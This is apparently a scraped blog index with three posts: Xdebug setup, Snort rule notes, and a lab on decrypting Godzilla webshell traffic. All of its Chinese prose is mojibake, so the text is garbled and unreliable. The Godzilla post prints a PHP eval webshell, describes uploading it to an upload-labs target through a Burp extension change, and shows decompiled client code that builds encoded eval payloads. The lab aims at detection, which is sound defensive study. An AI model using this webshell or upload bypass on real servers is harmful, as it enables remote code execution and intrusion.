Xdebugå®‰è£…å¥½PHPåï¼Œéœ€è¦å®‰è£…Xdebugï¼Œç”¨äºåŠ¨æ€åˆ†æçš„æ‰©å±•ã€‚ ä»å®˜ç½‘å®‰è£…çš„æ–¹å¼ï¼š åœ¨å®˜ç½‘ä¸‹è½½åˆé€‚è‡ªå·±å¹³å°çš„ç‰ˆæœ¬ï¼Œhttps://xdebug.org/download.phpã€‚ å®‰è£…è¿‡ç¨‹ï¼š è®¿é—®https://xdebug.org/wizard.phpï¼Œç„¶ååœ¨æµè§ˆå™¨ä¸­è®¿é—®æœ¬åœ°ç¯å¢ƒçš„phpinfoé¡µé¢ï¼ŒæŠŠphpinfoçš„å…¨éƒ¨è¾“å‡ºå†…å®¹ç²˜è´´åˆ°wizardä¸­ï¼Œç‚¹å‡»åˆ†æï¼Œä¼šè·å¾—å®‰è£…æŒ‡å—ã€‚ é€‚ç”¨mamp proçš„è¯ï¼Œå¯ä»¥ç›´æ¥ä»è½¯ä»¶ä¸­ï¼Œå®‰è£…xdebugæ’ä»¶ã€‚ mampçš„å…¶ä»–é…ç½®å¦‚ä¸‹ğŸ‘‡ PHPé…ç½®å’Œxdebugé…ç½®ä¿¡æ¯ æ‰¾åˆ°php8.2.0.ini è®¾ç½®ä¸€ä¸‹ide key æ£€éªŒxdebugæ˜¯å¦é…ç½®æˆæœ å¯åŠ¨æœåŠ¡ï¼Œç‚¹å‡»webstartï¼Œè¿›å…¥é¡µé¢åç‚¹å‡»phpinfoï¼Œæœç´¢xdebugã€‚ æœå¾—åˆ°ï¼Œä¸”èƒ½çœ‹åˆ°idekeyï¼Œé…ç½®æˆåŠŸ PHPSTORM é…ç½®Mamp proå·²ç»é€‰æ‹©äº†å·¥ä½œç›®å½•ï¼Œè¿è¡Œèµ·æ¥ã€‚ç„¶ååœ¨phpstormé‡Œæ‰“å¼€è¯¥å·¥ä½œç›®å½•ï¼Œä¼šæœ‰ä¸€ä¸ªindex.phpã€‚è¿›å…¥é…ç½® PHPé…ç½®å¦‚å›¾ï¼Œè‡ªå·±çœ‹ğŸ‘‡ debugé…ç½®å¦‚å›¾ğŸ‘‡ IDE keyå°±æ˜¯ä¸Šé¢xdebugè®¾ç½®çš„é‚£ä¸ª serversé…ç½®ğŸ‘‡ run&#x2F;debug configuration 1âƒ£ï¸ ğŸ‘‡ 2âƒ£ï¸ ç‚¹å‡»â•ï¼Œæ·»åŠ php web pageï¼Œé…ç½®å¦‚ä¸‹ğŸ‘‡ è¿è¡Œè°ƒè¯•è®¾ç½®æ–­ç‚¹ åœ¨é‚£ä¸€è¡Œçš„å‰é¢ç‚¹ä¸€ä¸‹ è¿è¡Œ å…ˆç‚¹ä¸€ä¸‹debugçš„å°è™«å­ï¼Œä¼šå¼¹å‡ºé¡µé¢ã€‚ å†ç‚¹ä¸€ä¸‹ç”µè¯ï¼Œå¼€å¯ç›‘å¬ã€‚æœ€åç‚¹å‡»è¿è¡Œï¼Œrerunã€‚æœ€ç»ˆæ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ ç»“æŸè¿è¡Œæ—¶ï¼Œå…³æ‰ç›‘å¬ï¼Œåœæ­¢è¿è¡Œã€‚ Firefox xdebugæ’ä»¶ä¸ºäº†è°ƒè¯•è¿‡ç¨‹æ›´é¡ºåˆ©ï¼Œå¯ä»¥ä½¿ç”¨firefoxçš„æ’ä»¶ã€‚ é…ç½®idekeyï¼Œå’Œå‰é¢ä¿æŒä¸€è‡´ å®‰è£…æ’ä»¶åè¿è¡Œ firefoxè®¿é—®http://localhost:8888/MAMP/phpinfo.phpï¼Œæ‰“å¼€xdebug ç„¶ååœ¨phpstormï¼Œæ‰“å¼€ç”µè¯ç›‘å¬ï¼Œç‚¹å‡»ç½‘é¡µä¸­çš„åŠŸèƒ½éƒ¨åˆ†ï¼Œä¼šè‡ªåŠ¨è·³åˆ°phpstormä¸­çš„æ–­ç‚¹ä½ç½®ã€‚","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://gryffinbit.top/tags/PHP/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://gryffinbit.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"author":"Gryffinbit"},{"title":"snort è§„åˆ™ç¼–å†™ç»éªŒç§¯ç´¯","slug":"snort-è§„åˆ™ç¼–å†™ç»éªŒç§¯ç´¯","date":"2023-01-16T10:20:49.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/01/16/snort-è§„åˆ™ç¼–å†™ç»éªŒç§¯ç´¯/","permalink":"https://gryffinbit.top/2023/01/16/snort-%E8%A7%84%E5%88%99%E7%BC%96%E5%86%99%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF/","excerpt":"","text":"https://blog.csdn.net/yalecaltech/article/details/89470968 æ•°æ®åŒ…ä¸­çš„ç‚¹ï¼Œå¯èƒ½ä¸æ˜¯ç‚¹ï¼Œæ˜¯ç©ºæ ¼ã€‚ $HTTP_PORTS èŒƒå›´ï¼Œä¸æ˜¯è¿™ä¸ªèŒƒå›´å†…çš„ï¼Œå¯ä»¥ç”¨anyåœ¨/etc/snort.confé‡Œé¢å¯ä»¥çœ‹åˆ°webçš„ç«¯å£ã€‚ 1portvar HTTP_PORTS [80,81,311,383,591,593,901,1220,1414,1741,1830,2301,2381,2809,3037,3128,3702,4343,4848,5250,6988,7000,7001,7144,7145,7510,7777,7779,8000,8008,8014,8028,8080,8085,8088,8090,8118,8123,8180,8181,8243,8280,8300,8800,8888,8899,9000,9060,9080,9090,9091,9443,9999,11371,34443,34444,41080,50002,55555] è‡ªå·±å¯ä»¥ä¿®æ”¹ æ­£åˆ™URLç¼–ç ï¼š[%\\w]+ 16è¿›åˆ¶â€˜\\râ€™æ˜¯å›è½¦ï¼ˆ 0Dï¼‰ï¼Œâ€™\\nâ€™æ˜¯æ¢è¡Œï¼ˆ 0Aï¼‰ï¼Œå‰è€…ä½¿å…‰æ ‡åˆ°è¡Œé¦–ï¼Œåè€…ä½¿å…‰æ ‡ä¸‹ç§»ä¸€æ ¼å¯¹åº”|0D0A| snortæ£€æµ‹æ•°æ®åŒ…1snort -c /etc/snort/snort.conf -A fast -r success.pcap -l /var/log/snort æ·»åŠ è§„åˆ™ 1vim /etc/snort/rules/local.rules æŸ¥çœ‹å‘Šè­¦ 1cat /var/log/snort/alert æ¸…é™¤ 12echo &quot; &quot;&gt; /var/log/snort/alertecho &quot; &quot;&gt; /etc/snort/rules/local.rules snortéœ€è¦æ³¨æ„çš„ç»†èŠ‚ ä½¿ç”¨http_methodçš„æ—¶å€™ï¼Œè¦ç›¸åº”çš„è§„å®šhttpçš„ç«¯å£ï¼ˆhttpæœåŠ¡ï¼‰ï¼Œè¦é™å®šç«¯å£æˆ–è€…æ˜¯ä½¿ç”¨$HTTP_PORTS å˜é‡ã€‚ä¸ç„¶æ— æ³•è§¦å‘ã€‚ 1ã€byte_extractå…³é”®å­—ä¼šä½¿æ£€æµ‹æŒ‡é’ˆå®šä½åˆ°byte_extractæ‰€æå–å†…å®¹åé¢ä¸€ä¸ªå­—èŠ‚çš„ä½ç½®ï¼Œåœ¨ä¸‹ä¸€ä¸ªåŒ¹é…ä¸­ç”¨åˆ°çš„relativeã€distanceç­‰éƒ½æ˜¯ç›¸å¯¹äºæ­¤ä½ç½®çš„ã€‚ä¾‹å¦‚ç”¨byte_extractæå–â€œ00 01 02 03 04 05â€ä¸­çš„02 03ï¼Œé‚£ä¹ˆï¼ŒæŒ‡é’ˆä¼šç§»åˆ°04çš„ä½ç½®ã€‚ 2ã€byte_testä¸ä¼šæ”¹å˜æ£€æµ‹æŒ‡é’ˆä½ç½®ã€‚ 3ã€content:!â€XXXXâ€ï¼Œ!å¦å®šæ£€æµ‹ä¼šå¯¼è‡´æ£€æµ‹æŒ‡é’ˆå›åˆ°åˆå§‹ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸‹ä¸€ä¸ªåŒ¹é…ä¸­çš„relativeã€distanceç›¸å¯¹çš„æ˜¯æ•´ä¸ªæ£€æµ‹å†…å®¹çš„å¼€å§‹ä½ç½®ã€‚ 4ã€byte_jumpå¦‚æœè·³åˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„ä½ç½®ï¼Œåˆ™ä¼šå¯¼è‡´æ­¤è§„åˆ™å¤±æ•ˆã€‚ä¾‹å¦‚å¾…æ£€å†…å®¹ä¸ºb6 5b 00 00 00 06 02 03 00 00 00 01ï¼Œç”¨byte_jump:2,4; è·³è¿‡ååˆ°è¾¾çš„æ˜¯æœ€åä¸€ä¸ªå­—èŠ‚01çš„ä¸‹ä¸€ä¸ªå­—èŠ‚ï¼Œä½†ä¸å­˜åœ¨è¿™ä¸ªå­—èŠ‚ï¼Œå› æ­¤ä¸ç®¡åé¢çš„åŒ¹é…æ˜¯ä»€ä¹ˆï¼Œè§„åˆ™éƒ½ä¸ä¼šå‘Šè­¦äº†ã€‚è¿™ç§æƒ…å†µå¯ä»¥ç”¨byte_extractæå–é•¿åº¦ï¼Œç”¨isdataatåˆ¤æ–­ä¸€ä¸‹ï¼Œå†ç”¨byte_jumpè·³è½¬ã€‚ 5ã€ä»å¼€æºæ¸ é“å¼•å…¥è§„åˆ™çš„æ—¶å€™ï¼Œå¦‚æœè§„åˆ™ä¸­åŒ…å«flowbitså…³é”®å­—ï¼Œä¸€å®šè¦æŠŠå‰ç»­å’Œåç»­è§„åˆ™éƒ½ä¸€èµ·å¼•å…¥ï¼Œè¦ä¸ç„¶è§„åˆ™ä¸ä¼šèµ·ä½œç”¨ã€‚ä¾‹å¦‚æœ‰å¸¦flowbits:issetçš„è§„åˆ™ï¼Œå°±è¦æ‰¾åˆ°å¯¹åº”çš„flowbits:setè§„åˆ™ã€‚","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[],"author":"Gryffinbit"},{"title":"å“¥æ–¯æ‹‰v4.0æµé‡è§£å¯†åŠç‰¹å¾æµé‡æå–","slug":"å“¥æ–¯æ‹‰v4.0æµé‡è§£å¯†åŠç‰¹å¾æµé‡æå–","date":"2022-12-26T11:30:18.000Z","updated":"2025-06-10T03:39:07.173Z","comments":true,"path":"2022/12/26/å“¥æ–¯æ‹‰v4.0æµé‡è§£å¯†åŠç‰¹å¾æµé‡æå–/","permalink":"https://gryffinbit.top/2022/12/26/%E5%93%A5%E6%96%AF%E6%8B%89v4.0%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86%E5%8F%8A%E7%89%B9%E5%BE%81%E6%B5%81%E9%87%8F%E6%8F%90%E5%8F%96/","excerpt":"","text":"å“¥æ–¯æ‹‰è½¯ä»¶å®‰è£…åŠä½¿ç”¨å®‰è£…é¡¹ç›®åœ°å€ï¼šhttps://github.com/BeichenDream/Godzilla/releases ä¸‹è½½.jar æ–‡ä»¶ã€‚ è¿è¡Œ 1java -jar godzilla.jar é¶åœºæ”»å‡» phpæ­å»ºçš„ç½‘ç«™å’Œjspæ­å»ºç½‘ç«™ï¼šapache æœåŠ¡å™¨ä¸€èˆ¬ä½¿ç”¨PHPæ­å»ºã€‚tomcat æœåŠ¡å™¨ä¸€èˆ¬ä½¿ç”¨jspæ­å»ºã€‚ æœ¨é©¬æ˜¯è¦åœ¨æœåŠ¡å™¨ä¸Šè‡ªåŠ¨æ‰§è¡Œï¼Œæ‰§è¡Œè„šæœ¬ï¼Œæ‰€ä»¥æœ¨é©¬æ ¼å¼è¦ä¸æœåŠ¡å™¨çš„è¯­è¨€ä¿æŒä¸€è‡´ã€‚æ¯”å¦‚phpçš„ç½‘ç«™ï¼Œè¦ç”¨phpçš„æœ¨é©¬ã€‚ è®¿é—®ç½‘ç«™index.phpï¼Œå¯ä»¥çœ‹å‡ºæ˜¯phpç½‘ç«™ï¼Œç”Ÿæˆphpçš„é©¬ ä½¿ç”¨uploadçš„é¶åœº 123docker search upload-labsdocker image pull c0ny1/upload-labsdocker run -d -p 80:8080 c0ny1/upload-labs ä½¿ç”¨å“¥æ–¯æ‹‰ç”Ÿæˆä¸€ä¸ªæœ¨é©¬ åç»­çš„å®éªŒï¼Œéƒ½ä¼šä»¥è¯¥æœ¨é©¬ä¸ºä¾‹å­ã€‚ä¼šåˆ†æPHP_EVAL_XOR_BASE64çš„åŠ å¯†æ–¹å¼ å°†å“¥æ–¯æ‹‰ç”Ÿæˆçš„æœ¨é©¬ä¸Šä¼ åˆ°é¶åœº æŒ‘ä¸€ä¸ªé¶åœºç¯å¢ƒï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ªã€‚burpæ‹¦æˆªï¼Œæ”¹åŒ…ï¼Œæ”¹æˆ.phpå†å‘é€ã€‚ å°†ç”Ÿæˆçš„æœ¨é©¬shell.php æˆåŠŸä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºã€‚ å“¥æ–¯æ‹‰è¿æ¥ç›®æ ‡åœ°å€ï¼šhttp://ip:8080/upload/shell.php åç¼–è¯‘è·å¾—è½¯ä»¶æºç JD-GUI åç¼–è¯‘ä¸‹è½½å·¥å…· https://jd-gui.apponic.com/mac/ M1 ç³»ç»ŸæŠ¥é”™ï¼š å³é”®JD-GUIï¼Œæ˜¾ç¤ºåŒ…å†…å®¹ è¿›å…¥Contents/MacOSæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€universalJavaApplicationStub.shæ–‡ä»¶ï¼Œä½¿ç”¨æ–°ç‰ˆçš„æ–‡ä»¶æ›¿æ¢ï¼Œæ–°ç‰ˆæ–‡ä»¶å†…å®¹å¯ä»¥åœ¨å¦‚ä¸‹åœ°å€å¤åˆ¶ https://raw.githubusercontent.com/tofi86/universalJavaApplicationStub/master/src/universalJavaApplicationStub åŒå‡»æ‰“å¼€è½¯ä»¶ï¼Œå°†éœ€è¦åç¼–è¯‘çš„jaråŒ…æ‹–åˆ°è½¯ä»¶ç•Œé¢ä¸­ é€‰ä¸­å…¨éƒ¨æ–‡ä»¶ï¼Œç‚¹å‡»File-Save All Sourcesä¿å­˜åç¼–è¯‘å®Œçš„æºç ï¼Œé€‰æ‹©ä¿å­˜è·¯å¾„ å“¥æ–¯æ‹‰åŠ å¯†åˆ†æå…¨å¥—çš„æ”»å‡»æµç¨‹ åœ¨å®¢æˆ·ç«¯ç”Ÿæˆshellï¼Œç”Ÿæˆshellçš„æ—¶å€™å¯ä»¥è®¾ç½®å‚æ•°ï¼ŒåŒ…æ‹¬ï¼šå¯†ç ã€å¯†é’¥ã€æœ‰æ•ˆè½½è·ã€åŠ å¯†å™¨ å¯†ç ï¼šPostè¯·æ±‚ä¸­çš„å‚æ•°åç§°ï¼ˆæœ¬æ¬¡å®éªŒçš„å¯†ç ä¸ºpasswdï¼‰ï¼Œä»¥åŠç”¨äºå’Œå¯†é’¥ä¸€èµ·è¿›è¡ŒåŠ å¯†è¿ç®—ã€‚ å¯†é’¥ï¼šç”¨äºå¯¹è¯·æ±‚æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œä¸è¿‡åŠ å¯†è¿‡ç¨‹ä¸­å¹¶éç›´æ¥ä½¿ç”¨å¯†é’¥æ˜æ–‡ï¼Œè€Œæ˜¯è®¡ç®—å¯†é’¥çš„md5å€¼ï¼Œç„¶åå–å…¶å‰16ä½ç”¨äºåŠ å¯†è¿‡ç¨‹ï¼ˆæœ¬æ¬¡å®éªŒçš„å¯†é’¥ä¸ºkeymdï¼Œmd5å€¼ä¸ºï¼š083c7c062cb29c75499967759dcd2423ï¼‰ æœ‰æ•ˆè½½è·åˆ†ä¸ºASPã€javaã€phpã€c#å››ç§ç±»å‹çš„payload åŠ å¯†å™¨åˆ†ä¸ºbase64å’Œrawã€evalbase64ä¸‰å¤§ç±»ã€‚ æ‰°ä¹±æ•°æ®ï¼šç”¨äºè‡ªå®šä¹‰HTTPè¯·æ±‚å¤´ï¼Œä»¥åŠåœ¨æœ€ç»ˆçš„è¯·æ±‚æ•°æ®å‰åé¢å¤–å†è¿½åŠ ä¸€äº›æ‰°ä¹±æ•°æ®ï¼Œè¿›ä¸€æ­¥é™ä½æµé‡çš„ç‰¹å¾ã€‚ ç”Ÿæˆshell.phpï¼ˆæ–‡ä»¶åå¯è‡ªå®šä¹‰ï¼Œæ ¹æ®é€‰æ‹©çš„æœ‰æ•ˆè½½è·ä¸åŒï¼Œå¯ä»¥æœ‰jspã€phpã€aspxç­‰æ–‡ä»¶æ ¼å¼ï¼‰ï¼Œè¯¥shell.phpéœ€è¦ä¸Šä¼ åˆ°æ”»å‡»çš„ç›®æ ‡ä¸»æœºä¸Šã€‚ è¿™ä¸ªæ–‡ä»¶ï¼Œä¼šå‡ºç°åœ¨æ•°æ®åŒ…çš„POSTè¯·æ±‚ä¸­ã€‚ è¯¥æ–‡ä»¶ä¼šå°†å¯†ç ã€å¯†é’¥çš„md5å€¼å‰16ä½æ˜æ–‡å†™å…¥ã€‚ è¯¥æ–‡ä»¶çš„å®ç°åŠŸèƒ½è¿˜æœ‰ï¼šå°†å¯†ç å’Œå¯†é’¥è¿›è¡Œæ‹¼æ¥ï¼Œç„¶åè¿›è¡Œmd5çš„è®¡ç®—ã€‚ä¸€å…±32ä½ã€‚æœåŠ¡å™¨ç«¯è¿”å›æ•°æ®çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œæ‹¼æ¥ã€‚å³æœåŠ¡å™¨ç«¯è¿”å›æ•°æ® &#x3D; md5å‰16ä½+åŠ å¯†æ•°æ®+md5å16ä½ã€‚ï¼ˆåŠ å¯†æ•°æ®å¯ä»¥é€šè¿‡å¯¹æœåŠ¡å™¨ç«¯çš„è§£å¯†ç®—æ³•è¿›è¡Œè§£å¯†ï¼‰ å“¥æ–¯æ‹‰å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥ URLæ˜¯ç›®æ ‡ä¸»æœºä¸Šçš„shell.php è¯·æ±‚é…ç½®çš„å‚æ•°ï¼Œå¯ä»¥æ·»åŠ å†—ä½™æ•°æ®ï¼Œè¯¥å†—ä½™æ•°æ®ä¼šåœ¨æ•°æ®çš„æ­£å¼å†…å®¹çš„å‰åæ·»åŠ è¿›å»ã€‚ è¿æ¥æˆåŠŸåï¼Œè¿›å…¥shellä¾¿å¯ä»¥è¿›è¡Œæ“ä½œã€‚ ç”Ÿæˆçš„shellä»¥PHP_EVAL_XOR_BASE64çš„åŠ å¯†æ–¹å¼ä¸ºä¾‹ã€‚ç”Ÿæˆçš„æœ¨é©¬shell.phpå†…å®¹ä¸º 12&lt;?phpeval($_POST[&quot;passwd&quot;]); å®ƒçš„å·¥ä½œåŸç†æ˜¯ï¼Œå­˜åœ¨ä¸€ä¸ªå˜é‡â€œpasswdâ€ï¼Œâ€œpasswdâ€çš„å–å€¼ä¸ºhttpçš„postæ–¹å¼ã€‚webæœåŠ¡å™¨å¯¹â€œpasswdâ€œå–å€¼åï¼Œç„¶åé€šè¿‡eval()å‡½æ•°æ‰§è¡Œâ€œpasswdâ€é‡Œé¢çš„å†…å®¹ã€‚æ¯”å¦‚è¯´ï¼Œå°†è¯¥shell.phpçš„æ–‡ä»¶ä¼ å…¥ç«™ç‚¹ï¼Œä»¥POSTæ–¹å¼ä¼ å…¥passwd=phpinfo();ã€‚åˆ™é¡µé¢ä¼šæ˜¾ç¤ºphpinfoçš„ä¿¡æ¯ã€‚ è¯¥å˜é‡â€œpasswdâ€ï¼Œæ˜¯æœ€å¼€å§‹ç”Ÿæˆshellï¼Œè‡ªå·±è®¾ç½®çš„å¯†ç ã€‚ æŠ“åŒ…åˆ†æ-æŸ¥çœ‹â€œæµ‹è¯•è¿æ¥â€æ“ä½œä¼šäº§ç”Ÿçš„æ•°æ®åŒ…è®¾ç½®ä»£ç†ï¼Œç”¨burpsuiteæ‹¦æˆªï¼ŒæŸ¥çœ‹äº§ç”Ÿçš„æ•°æ®åŒ… ä¼šäº§ç”Ÿä¸‰ä¸ªæ•°æ®åŒ…ã€‚å¹¶ä¸”ä¼šè®¾ç½®PHPSESSIDã€‚ ä»æ•°æ®åŒ…ä¸­å¯ä»¥å‘ç°ã€‚requestä¸­å‘é€çš„æ•°æ®åŒ…ï¼Œæ˜¯passwd=xxxx çš„å½¢å¼ã€‚æ ¹æ®ç”Ÿæˆæœ¨é©¬shell.phpä¸­çš„å†…å®¹å¯çŸ¥ã€‚webæœåŠ¡å™¨å¯¹â€œpasswdâ€œå–å€¼åï¼Œç„¶åé€šè¿‡eval()å‡½æ•°æ‰§è¡Œâ€œpasswdâ€é‡Œé¢çš„å†…å®¹ã€‚å³å®é™…æ“ä½œå†…å®¹æ˜¯passwdåé¢ä¸€å¤§ä¸²åŠ å¯†è¿‡çš„å­—ç¬¦ã€‚ å¯¹ç¬¬ä¸€ä¸ªæ•°æ®åŒ…è¿›è¡Œåˆ†æè¿½æº¯è¿æ¥æ—¶ï¼ŒåŠŸèƒ½ä»£ç éƒ¨åˆ†åœ¨core/shell/ShellEntity.java æ‰¾åˆ°initShellOpertion()å‡½æ•° è¯¥æ–¹æ³•é¦–å…ˆåˆå§‹åŒ–ä¸€ä¸ªHttpå¯¹è±¡èµ‹å€¼ç»™ShellEntityå¯¹è±¡çš„httpæˆå‘˜å˜é‡(æ¯ä¸ªShellEntityå¯¹è±¡éƒ½æœ‰è‡ªå·±çš„httpæˆå‘˜å˜é‡, ç”¨äºå„ShellEntityçš„Httpè¯·æ±‚), ç„¶ååˆå§‹åŒ–payloadModel å’Œ cryptionModel å¯¹è±¡ã€‚ è¿è¡Œçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨initæ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ã€‚ä»¥åŠè°ƒç”¨äº†testå‡½æ•°ï¼Œå¯¹çŠ¶æ€è¿›è¡Œäº†åˆ¤æ–­ã€‚æ‰€ä»¥è¿›ä¸€æ­¥åˆ†æè¿™ä¸¤ä¸ªå‡½æ•°ã€‚ å› ä¸ºä»£ç æ˜¯åç¼–è¯‘è¿‡æ¥çš„ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ç”¨ctrlå®šä½åˆ°æ–¹æ³•çš„å®šä¹‰ï¼Œéœ€è¦æ‰‹åŠ¨å»æ‰¾ã€‚ initæ–¹æ³• ï¼ˆè·¯å¾„shells/cryptions/phpXor/PhpEvalXor.java initä¸­çš„å˜é‡ShellEntity shellContextï¼Œä¸ºè¿æ¥ä¿¡æ¯ã€‚ this.shell = context;å°†webshellé…ç½®ç•Œé¢ä¿®æ”¹çš„å†…å®¹åŒæ­¥åˆ°shellContextå¯¹è±¡ä¸Šã€‚ 1234567891011121314151617181920/* */ public ShellEntity(boolean useCache) &#123;/* 55 */ this.url = &quot;&quot;;/* 56 */ this.password = &quot;&quot;;/* 57 */ this.secretKey = &quot;&quot;;/* 58 */ this.payload = &quot;&quot;;/* 59 */ this.cryption = &quot;&quot;;/* 60 */ this.remark = &quot;&quot;;/* 61 */ this.encoding = &quot;&quot;;/* 62 */ this.headers = new HashMap&lt;&gt;();/* 63 */ this.reqLeft = &quot;&quot;;/* 64 */ this.reqRight = &quot;&quot;;/* 65 */ this.connTimeout = 60000;/* 66 */ this.readTimeout = 60000;/* 67 */ this.proxyType = &quot;&quot;;/* 68 */ this.proxyHost = &quot;&quot;;/* 69 */ this.proxyPort = 8888;/* 70 */ this.id = &quot;&quot;;/* 71 */ this.useCache = useCache;/* */ &#125; this.http = this.shell.getHttp(); å…¶ä¸­getHttp()å‡½æ•°è·å–åˆ°ä¼ å…¥è¯¥æ–¹æ³•çš„ShellEntityå¯¹è±¡çš„httpæˆå‘˜å˜é‡ã€‚ getHttp()å‡½æ•°ï¼ˆè·¯å¾„core/shell/ShellEntity.java 123/* */ public Http getHttp() &#123;/* 120 */ return this.http;/* */ &#125; this.key è¿™ä¸€è¡Œï¼Œæ˜¯é€å­—èŠ‚çš„è·å–å¯†é’¥keyã€‚ this.pass è¿™ä¸€è¡Œï¼Œæ˜¯é€å­—èŠ‚çš„è·å–å¯†ç passwordã€‚ String findStrMd5 è¿™ä¸€è¡Œï¼Œæ˜¯å°†å¯†é’¥keyå’ŒpasswordåŠ èµ·æ¥ï¼Œå·²ç»è¿›è¡Œmd5çš„è®¡ç®—ã€‚ this.findStrLeft è¿™ä¸€è¡Œï¼Œæ˜¯è·å–md5çš„å‰16ä½ï¼ˆç”Ÿæˆçš„md5ä¸€å…±æœ‰32ä½ï¼‰ this.findStrRight è¿™ä¸€è¡Œï¼Œæ˜¯è·å–md5çš„å16ä½ï¼ˆç”Ÿæˆçš„md5ä¸€å…±æœ‰32ä½ï¼‰ this.evalContent è¿™ä¸€è¡Œï¼Œæ˜¯è¿›è¡Œäº†ä¸€å¥—ç¼–ç è¿‡ç¨‹ã€‚ç»è¿‡äº†base64å’Œurlçš„ç¼–ç å¤„ç†å’Œå¯†é’¥çš„å¤„ç†ã€‚ éœ€è¦ä¼ å…¥å¯†é’¥ã€å¯†é’¥md5çš„å‰16ä½ï¼Œç„¶åå†æ”¾å…¥evalå‡½æ•°ä¸­â€&lt;?phpâ€ 12345678/* */ public String generateEvalContent() &#123;/* 112 */ String eval = (new String(Generate.GenerateShellLoder(this.shell.getSecretKey(), functions.md5(this.shell.getSecretKey()).substring(0, 16), false))).replace(&quot;&lt;?php&quot;, &quot;&quot;);/* 113 */ eval = functions.base64EncodeToString(eval.getBytes());/* 114 */ eval = (new StringBuffer(eval)).reverse().toString();/* 115 */ eval = String.format(&quot;eval(base64_decode(strrev(urldecode(&#x27;%s&#x27;))));&quot;, new Object[] &#123; URLEncoder.encode(eval) &#125;);/* 116 */ eval = URLEncoder.encode(eval);/* 117 */ return eval;/* */ &#125; è·å–åˆ°httpæˆå‘˜å˜é‡å, å› ä¸ºè¯¥httpæˆå‘˜å˜é‡æœ‰ShellEntityå¯¹è±¡çš„ç›¸å…³ä¿¡æ¯, åŒ…æ‹¬è¿æ¥urlã€ä»£ç†ã€passwordã€secretKeyç­‰å†…å®¹, å³ä¿å­˜æœ‰å¯¹åº”çš„webshellé…ç½®ä¿¡æ¯, å› æ­¤å¯ä»¥ç›´æ¥å¯¹ç›¸å…³çš„webshellå‘èµ·è¯·æ±‚ã€‚é€šè¿‡ this.http.sendHttpResponse(this.payload);å‘é€äº†è¯·æ±‚ã€‚ ä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªæ•°æ®åŒ…ã€‚ å¯¹2ã€3æ•°æ®åŒ…è¿›è¡Œè¿½æº¯ï¼ˆ2ã€3æ•°æ®åŒ…å†…å®¹ä¸€æ ·ï¼‰test æ–¹æ³•ã€‚test()å‡½æ•° æ˜¯ä¸€ä¸ªå¸ƒå°”å‹çš„ã€‚æµ‹è¯•æˆåŠŸåï¼Œä¼šè¿”å›trueã€‚ifå‡½æ•°é¡ºåˆ©è¿è¡Œï¼Œè¿æ¥æˆåŠŸã€‚ 1234567891011/* */ public boolean test() &#123;/* 222 */ ReqParameter parameter = new ReqParameter();/* 223 */ byte[] result = evalFunc(null, &quot;test&quot;, parameter);/* 224 */ String codeString = new String(result);/* 225 */ if (codeString.trim().equals(&quot;ok&quot;)) &#123;/* 226 */ this.isAlive = true;/* 227 */ return true;/* */ &#125; /* 229 */ Log.error(codeString);/* 230 */ return false;/* */ &#125; trim() å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚ test()çš„æ‰§è¡Œè¿‡ç¨‹ä¸ºï¼šè°ƒç”¨äº†evalFuncå‡½æ•°ã€‚è¯¥å‡½æ•°å°†æ•°æ®POSTç»™æœåŠ¡å™¨ï¼Œå¹¶è·å¾—æœåŠ¡å™¨çš„å“åº”ã€‚ 1byte[] result = evalFunc(null, &quot;test&quot;, parameter); // è·å¾—æœåŠ¡å™¨çš„å“åº” å°†æœåŠ¡å™¨çš„è¿”å›ç»“æœæ ¼å¼ä¿®æ”¹åï¼Œä¸okå¯¹æ¯”ï¼Œåˆ¤æ–­ä¸ºokåˆ™è¿æ¥æˆåŠŸã€‚ 123456String codeString = new String(result);if (codeString.trim().equals(&quot;ok&quot;)) &#123; // å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ ¼å¼ä¿®æ”¹ï¼Œä½¿ä¹‹æ²¡æœ‰ç©ºæ ¼ã€‚æœåŠ¡å™¨è¿”å›okçš„è¯ï¼Œåˆ™è¿æ¥æˆåŠŸ return true; &#125; è¯´æ˜åœ¨evalFuncå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå·²ç»å¾—åˆ°äº†æ˜æ–‡çš„æœåŠ¡å™¨è¿”å›æ•°æ®ï¼Œå› æ­¤æœåŠ¡å™¨è¿”å›æŠ¥æ–‡çš„è§£å¯†è¿‡ç¨‹è‚¯å®šæ˜¯åœ¨evalFuncå‡½æ•°ä¸­ã€‚ æŸ¥çœ‹evalFunc å‡½æ•°ï¼ˆè·¯å¾„shells/payloads/php/PhpShell.javaï¼‰ï¼Œé€šè¿‡this.http.sendHttpResponse(data).getResult();å‘é€äº†è¯·æ±‚æ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯ç¬¬2ã€3ä¸ªæ•°æ®åŒ…ã€‚ 1234567891011121314/* */ public byte[] evalFunc(String className, String funcName, ReqParameter parameter) &#123;/* 100 